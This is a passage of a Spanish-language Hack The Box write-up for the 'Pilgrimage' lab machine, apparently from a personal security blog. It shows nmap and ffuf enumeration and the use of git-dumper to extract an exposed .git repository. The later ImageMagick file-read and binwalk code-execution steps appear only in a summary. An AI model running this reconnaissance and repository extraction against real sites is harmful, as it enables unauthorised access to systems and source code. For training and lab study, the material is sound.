@@ -1,0 +1,556 @@
+<!doctype html><html lang="es"><head><title>Pilgrimage | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web que expone un repositorio de Git. Podemos extraer el código fuente en PHP de la aplicación web y descubrir que usa ImageMagick por detrás para procesar imágenes subidas. La versión de ImageMagick tiene una vulnerabilidad de lectura de archivos locales que se puede usar para leer un archivo de base de datos SQLite y encontrar una contraseña en texto claro para emily, que también se usa en SSH. Después de eso, encontramos que root ejecuta un script en Bash que usa binwalk para eliminar malware de los archivos de imagen subidos. La versión de binwalk es vulnerable a ejecución remota de comandos, lo que conduce a la escalada de privilegios"><meta name="image" content="https://7rocky.github.io/images/HTB/Pilgrimage/Pilgrimage.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web que expone un repositorio de Git. Podemos extraer el código fuente en PHP de la aplicación web y descubrir que usa ImageMagick por detrás para procesar imágenes subidas. La versión de ImageMagick tiene una vulnerabilidad de lectura de archivos locales que se puede usar para leer un archivo de base de datos SQLite y encontrar una contraseña en texto claro para emily, que también se usa en SSH. Después de eso, encontramos que root ejecuta un script en Bash que usa binwalk para eliminar malware de los archivos de imagen subidos. La versión de binwalk es vulnerable a ejecución remota de comandos, lo que conduce a la escalada de privilegios"><meta itemprop="keywords" content="git,cve,php,file-upload,static-code-analysis,lfr,password-reuse,rce,"><meta itemprop="name" content="Pilgrimage"><meta property="article:published_time" content="2023-11-25T00:00:00+00:00"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web que expone un repositorio de Git. Podemos extraer el código fuente en PHP de la aplicación web y descubrir que usa ImageMagick por detrás para procesar imágenes subidas. La versión de ImageMagick tiene una vulnerabilidad de lectura de archivos locales que se puede usar para leer un archivo de base de datos SQLite y encontrar una contraseña en texto claro para emily, que también se usa en SSH. Después de eso, encontramos que root ejecuta un script en Bash que usa binwalk para eliminar malware de los archivos de imagen subidos. La versión de binwalk es vulnerable a ejecución remota de comandos, lo que conduce a la escalada de privilegios"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Pilgrimage/Pilgrimage.webp"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Pilgrimage"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/pilgrimage/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web que expone un repositorio de Git. Podemos extraer el código fuente en PHP de la aplicación web y descubrir que usa ImageMagick por detrás para procesar imágenes subidas. La versión de ImageMagick tiene una vulnerabilidad de lectura de archivos locales que se puede usar para leer un archivo de base de datos SQLite y encontrar una contraseña en texto claro para emily, que también se usa en SSH. Después de eso, encontramos que root ejecuta un script en Bash que usa binwalk para eliminar malware de los archivos de imagen subidos. La versión de binwalk es vulnerable a ejecución remota de comandos, lo que conduce a la escalada de privilegios"><meta name="twitter:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web que expone un repositorio de Git. Podemos extraer el código fuente en PHP de la aplicación web y descubrir que usa ImageMagick por detrás para procesar imágenes subidas. La versión de ImageMagick tiene una vulnerabilidad de lectura de archivos locales que se puede usar para leer un archivo de base de datos SQLite y encontrar una contraseña en texto claro para emily, que también se usa en SSH. Después de eso, encontramos que root ejecuta un script en Bash que usa binwalk para eliminar malware de los archivos de imagen subidos. La versión de binwalk es vulnerable a ejecución remota de comandos, lo que conduce a la escalada de privilegios"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Pilgrimage/Pilgrimage.webp"><meta name="twitter:title" content="Pilgrimage"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/htb/pilgrimage/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/pilgrimage/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/pilgrimage/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/pilgrimage/&amp;text=Pilgrimage" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/pilgrimage/&amp;title=Pilgrimage" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Pilgrimage</h1><time class="mt4 f6 dib tracked" datetime="2023-11-25T00:00:00+01:00">25 / 11 / 2023</time><br><p class="mb4 f6 dib tracked">13 minutos de lectura</p></header><div class="htb-image"><img alt="Pilgrimage" src="/images/HTB/Pilgrimage/Pilgrimage.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/git" title="Git">Git</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-upload" title="Subida de archivos">Subida de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/lfr" title="Lectura de Archivos Locales">Lectura de Archivos Locales</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-de-git">Enumeración de Git</a></li><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Fácil</li><li><strong>Dirección IP</strong>: 10.10.11.219</li><li><strong>Fecha</strong>: 24 / 06 / 2023</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.94 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.219 -p 22,80
+Nmap scan report for 10.10.11.219
+Host is up (0.041s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
+|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
+|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://pilgrimage.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 8.01 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.219</code> se nos redirige a <code>http://pilgrimage.htb</code>. Después de poner el dominio en <code>/etc/hosts</code> vemos esta página web:</p><p><img src="/images/HTB/Pilgrimage/Pilgrimage-1.webp" alt="Pilgrimage 1"></p><p>Hay una funcionalidad para cargar archivos. Por el momento, apliquemos <em>fuzzing</em> con <code>ffuf</code> para enumerar más rutas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://pilgrimage.htb/FUZZ  
+
+<span class="code-dark-blue">[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 33ms]</span>
+    * FUZZ: tmp
+
+<span class="code-dark-yellow">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 33ms]</span>
+    * FUZZ: .html
+
+<span class="code-dark-yellow">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]</span>
+    * FUZZ: .htm
+
+<span class="code-dark-blue">[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 38ms]</span>
+    * FUZZ: assets
+
+<span class="code-dark-green">[Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 36ms]</span>
+    * FUZZ: .
+
+<span class="code-dark-yellow">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 40ms]</span>
+    * FUZZ: .htaccess
+
+<span class="code-dark-blue">[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 36ms]</span>
+    * FUZZ: vendor
+
+<span class="code-dark-yellow">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 35ms]</span>
+    * FUZZ: .htc
+
+<span class="code-dark-yellow">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 36ms]</span>
+    * FUZZ: .html_var_DE
+
+<span class="code-dark-yellow">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]</span>
+    * FUZZ: .htpasswd
+
+<span class="code-dark-blue">[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 37ms]</span>
+    * FUZZ: .git
+
+<span class="code-dark-yellow">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 38ms]</span>
+    * FUZZ: .html.
+
+<span class="code-dark-yellow">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 36ms]</span>
+    * FUZZ: .html.html
+
+<span class="code-dark-yellow">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 37ms]</span>
+    * FUZZ: .htpasswds
+
+...
+</code></pre></div><p>Vemos que hay un directorio <code>.git</code> expuesto&mldr;</p><h3 id="enumeración-de-git">Enumeración de Git</h3><p>Vamos a usar <a href="https://pypi.org/project/git-dumper/"><code>git-dumper</code></a> para extraer el repositorio de Git:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git-dumper</span> http://pilgrimage.htb/.git/ <span class="mtku">.</span>
+[-] Testing http://pilgrimage.htb/.git/HEAD [200]
+[-] Testing http://pilgrimage.htb/.git/ [403]
+[-] Fetching common files
+[-] Fetching http://pilgrimage.htb/.gitignore [404]
+[-] Fetching http://pilgrimage.htb/.git/description [200]
+[-] http://pilgrimage.htb/.gitignore responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]
+[-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
+[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/info/exclude [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/info/packs [404]
+[-] http://pilgrimage.htb/.git/objects/info/packs responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200]
+[-] Fetching http://pilgrimage.htb/.git/index [200]
+[-] Finding refs/
+[-] Fetching http://pilgrimage.htb/.git/FETCH_HEAD [404]
+[-] http://pilgrimage.htb/.git/FETCH_HEAD responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/HEAD [200]
+[-] Fetching http://pilgrimage.htb/.git/ORIG_HEAD [404]
+[-] http://pilgrimage.htb/.git/ORIG_HEAD responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/config [200]
+[-] Fetching http://pilgrimage.htb/.git/logs/HEAD [200]
+[-] Fetching http://pilgrimage.htb/.git/info/refs [404]
+[-] http://pilgrimage.htb/.git/info/refs responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/master [200]
+[-] Fetching http://pilgrimage.htb/.git/packed-refs [404]
+[-] http://pilgrimage.htb/.git/packed-refs responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD [404]
+[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/master [404]
+[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/master responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/logs/refs/stash [404]
+[-] http://pilgrimage.htb/.git/logs/refs/stash responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/refs/heads/master [200]
+[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/HEAD [404]
+[-] http://pilgrimage.htb/.git/refs/remotes/origin/HEAD responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/master [404]
+[-] http://pilgrimage.htb/.git/refs/remotes/origin/master responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master [404]
+[-] Fetching http://pilgrimage.htb/.git/refs/stash [404]
+[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
+[-] http://pilgrimage.htb/.git/refs/stash responded with status code 404
+[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master [404]
+[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
+[-] Finding packs
+[-] Finding objects
+[-] Fetching objects
+[-] Fetching http://pilgrimage.htb/.git/objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
+[-] http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404  
+[-] Fetching http://pilgrimage.htb/.git/objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/76/a559577d4f759fff6af1249b4a277f352822d5 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/e1/a40beebc7035212efdcb15476f9c994e3634a7 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/b2/15e14bb4766deff4fb926e1aa080834935d348 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/b6/c438e8ba16336198c2e62fee337e126257b909 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/c4/3565452792f19d2cf2340266dbecb82f2a0571 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/11/dbdd149e3a657bc59750b35e1136af861a579f [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/49/cd436cf92cc28645e5a8be4b1973683c95c537 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/8a/62aac3b8e9105766f3873443758b7ddf18d838 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/5f/ec5e0946296a0f09badeb08571519918c3da77 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/dc/446514835fe49994e27a1c2cf35c9e45916c71 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212 [200]
